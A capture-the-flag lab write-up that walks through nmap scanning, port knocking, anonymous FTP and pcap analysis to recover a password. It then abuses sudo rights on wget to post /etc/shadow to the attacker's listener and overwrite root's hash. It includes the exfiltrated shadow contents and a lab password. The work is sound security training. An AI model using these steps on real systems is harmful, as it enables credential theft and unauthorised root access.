## Description
 The purpose of this lab is to learn how to perform network packet analysis in order to get more intel about the hidden network infrastructure, detect misconfigurations, and most importantly, how you can make use of this intel to get access to systems and escalate your privileges. 
## Enumeration
 We started by scanning using `nmap`.
 nmap result:
 ```bash
 PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4f:d3:06:c9:29:81:07:68:3a:c1:2b:49:12:39:c6:19 (RSA)
|   256 f8:fe:33:8d:d9:d5:97:3b:14:08:18:10:4f:3a:19:5c (ECDSA)
|_  256 c2:d5:c2:60:62:0d:cd:a9:83:01:92:b6:dd:be:d6:a2 (ED25519)
80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Port 21 filtered means that the port is being blocked by a firewall.
## Exploiting
Using `knock` we can allow connection to port 21. 
```knock works by requiring connection attempts to a series of predefined closed ports. With a simple port knocking method, when the correct sequence of port "knocks" (connection attempts) is received, the firewall opens certain port(s) to allow a connection.```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.4.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            5930 Aug 28  2019 login.pcap
```
We can log in into FTP anonymously,we found a file named `login.pcap` we got it using `get`.
Using strings we can find any readable content in the file.
We can see a HTTP request using POST method,which is used to submit data to be processed by the resource identified by the URL.
The body of the request contains the data being sent to the server, in this case the username and password, encoded as `username=kabayla&password=K%40b%40ylA%21`.
So the decoded password is : `K@b@ylA!`
We can easily login using `ssh` with this credentials.
We can use `sudo -l` to list the user's sudo privileges.
So our user `kabayla` can run `/usr/bin/wget` as root without password.
Using `wget` we can post some files to our machine using `--post-file` option.
Starting our listener for port 80 we can get the files that we post from `wget`.
Doing this trick with /etc/shadow can help us view the password hash. We can crack it or overwrite it.
We got the POST request:
```bash
POST / HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 172.16.1.203
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1021

root:*:18099:0:99999:7:::
daemon:*:18099:0:99999:7:::
bin:*:18099:0:99999:7:::
sys:*:18099:0:99999:7:::
sync:*:18099:0:99999:7:::
games:*:18099:0:99999:7:::
man:*:18099:0:99999:7:::
lp:*:18099:0:99999:7:::
mail:*:18099:0:99999:7:::
news:*:18099:0:99999:7:::
uucp:*:18099:0:99999:7:::
proxy:*:18099:0:99999:7:::
www-data:*:18099:0:99999:7:::
backup:*:18099:0:99999:7:::
list:*:18099:0:99999:7:::
irc:*:18099:0:99999:7:::
gnats:*:18099:0:99999:7:::
nobody:*:18099:0:99999:7:::
systemd-network:*:18099:0:99999:7:::
systemd-resolve:*:18099:0:99999:7:::
syslog:*:18099:0:99999:7:::
messagebus:*:18099:0:99999:7:::
_apt:*:18099:0:99999:7:::
lxd:*:18099:0:99999:7:::
uuidd:*:18099:0:99999:7:::
dnsmasq:*:18099:0:99999:7:::
landscape:*:18099:0:99999:7:::
sshd:*:18099:0:99999:7:::
pollinate:*:18099:0:99999:7:::
ubuntu:!:18136:0:99999:7:::
ftp:*:18136:0:99999:7:::
kabayla:$6$MC5Bf0ny.RmVf$q/j4e1ab8xkBF9rRtILPemtZq3BMrPkjK.mCcb7jraCMBswToeYwTtKDqHgwlmNA6sCZv2rlOQ6hdGqv63Aqb1:18136:0:99999:7:::
Debian-snmp:!:18971:0:99999:7:::
```

We saved the output in a file named `shadow` in our machine, then we update the hash of root account we haah of kabayla account so they have the same hash, and we can easily log in root using the password of kabayala.
after editing the hash we can launch http server, and using `wget` we can replace the machine shadow with our modified shadow.
Then we easily logged in root,and got our flag.
